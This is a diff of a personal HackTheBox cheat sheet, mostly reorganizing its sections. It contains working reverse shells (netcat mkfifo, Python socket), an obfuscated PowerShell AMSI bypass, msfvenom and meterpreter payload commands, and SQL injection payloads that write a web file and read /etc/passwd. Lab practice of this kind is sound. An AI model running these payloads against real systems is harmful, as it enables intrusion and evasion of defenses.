@@ -6,15 +6,15 @@ Commands I usually use when doing HTB machines
 - [Enumeration](#enumeration)
 - [Bruteforce](#bruteforce)
 - [Linux Privilege Escalation](#linux-privilege-escalation)
-- [Utilities](#tools-and-utilities)
+- [Utilities](#utilities)
 - [Reverse Shells](#reverse-shells)
 - [Services](#services)
 - [Tools](#tools)
+- [Wordlists](#wordlists)
 - [Miscellaneous](#miscellaneous)
 - [Tunneling](#tunneling)
 - [Web Exploitation](#web-exploitation)
-- [Windows Privilege Escalation](#windows-privilege-escalation)
-- [Wordlists](#wordlists)
+- [Windows Enumeration & Privilege Escalation](#windows-enumeration-and-privilege-escalation)
   
 ---
 
@@ -219,7 +219,7 @@ export PATH=.:$PATH
 
 ---
 
-## Tools and Utilities
+## Utilities
 ### Random Commands
 #### mtu speed
 
@@ -281,12 +281,12 @@ gpg --decrypt fragment.asc
 
 ## Reverse Shells
 
-### mkfifo payload
+### mkfifo
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
-### python payload
+### python
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
@@ -315,11 +315,31 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 ./xc -l -p 9001
 ```
 
+### shellcat (my tool)
+https://github.com/seriotonctf/shellcat
+
 ---
 
 ### Obfuscated PowerShell reverse shell
 ```powershell
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+### SharpEvader
+
+[https://github.com/Xyan1d3/SharpEvader](https://github.com/Xyan1d3/SharpEvader)
+
+```bash
+python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
+```
+
+### msfvenom
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o exploit.aspx
+```
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x25\x26" -f python -v shellcode
 ```
 
 ---
@@ -491,9 +511,7 @@ docker save [image] -o layers.tar
 
 #### extract docker layers
 
-```bash
-<https://github.com/micahyoung/docker-layer-extract>
-```
+- https://github.com/micahyoung/docker-layer-extract
 
 ### Git
 To see previous commits
@@ -597,25 +615,22 @@ rsync <filename> rsync://sys-internal@<IP>/files/sys-internal/.ssh
 
 ## Tools
 
-### Enumeration tools
-- lse.sh : https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
-- linpeas.sh : https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
-- winpeas.exe : https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
+### Enumeration Tools
+- lse.sh: https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
+- linpeas.sh: https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
+- winpeas.exe: https://github.com/carlospolop/PEASS-ng/releases/tag/20230808-5e84dec0
+- pspy64: https://github.com/DominicBreuker/pspy/releases
 
-### Exploitation Tools
-#### msfvenom
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx -o exploit.aspx
-```
-
-```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x25\x26" -f python -v shellcode
-```
-
-#### searchsploit
+### searchsploit
 ```bash
 searchsploit -m php/webapps/49876.py [module name]
 ```
+
+### gMSADumper
+
+[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
+
+### sucrack: https://github.com/hemp3l/sucrack
 
 ### Compiled Binaries
 
@@ -623,19 +638,31 @@ searchsploit -m php/webapps/49876.py [module name]
 
 [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 
-### Exploitation Tools
-- gMSADumper
+---
 
-[https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper)
-- SharpEvader
+## Wordlists
 
-[https://github.com/Xyan1d3/SharpEvader](https://github.com/Xyan1d3/SharpEvader)
+### Seclists
+- seclists : https://github.com/danielmiessler/SecLists
+- rockyou.txt
+
+### Make a wordlists out of a website
 
 ```bash
-python3 sharpevader.py -p windows/x64/meterpreter/reverse_tcp -lh tun0 -lp 9001
+cewl -w wordlists.cewl $website -d 3
 ```
 
-- sucrack: https://github.com/hemp3l/sucrack
+### Make lower/upper case wordlist
+
+```bash
+cat wordlist.cewl | tr '[:upper:]' '[:lower:]' >> wordlists.cewl
+```
+
+### Sort a wordlist
+
+```bash
+cat wordlists.cewl | sort -u > sorted.lst
+```
 
 ---
 
@@ -753,7 +780,7 @@ export http_proxy=127.0.0.1:8080
 ' UNION SELECT 1,'serioton' INTO OUTFILE '/var/www/html/test.html' -- -
 ```
 
-#### read file
+#### read a file
 
 ```sql
 ' UNION SELECT 1,load_file('/etc/passwd') -- -
@@ -761,13 +788,12 @@ export http_proxy=127.0.0.1:8080
 
 ---
 
-## Windows
+## Windows Enumeration & Privilege Escalation
 The script below looks for Win32 services on the host with unquoted service paths, not in the Windows folder.
 ```powershell
 Get-WmiObject -Class Win32_Service | Where-Object { $*.PathName -inotmatch “`”” -and $*.PathName -inotmatch “:\\\\Windows\\\\” }| Select Name,Pathname
 ```
 
-### Windows Privilege Escalation
 - check for user privileges
 ```powershell
 whoami /priv
@@ -817,30 +843,4 @@ bloodhound
 - bloodhound python
 ```bash
 bloodhound-python -c all -u <username> -p <password> -d <domain> -dc <dc> -ns <ip> --disable-pooling -w1 --dns-timeout 30
-```
-
----
-
-## Wordlists
-
-### Seclists
-- seclists : https://github.com/danielmiessler/SecLists
-- rockyou.txt
-
-### Make a wordlists out of a website
-
-```bash
-cewl -w wordlists.cewl $website -d 3
-```
-
-### Make lower/upper case wordlist
-
-```bash
-cat wordlist.cewl | tr '[:upper:]' '[:lower:]' >> wordlists.cewl
-```
-
-### Sort a wordlist
-
-```bash
-cat wordlists.cewl | sort -u > sorted.lst
 ```
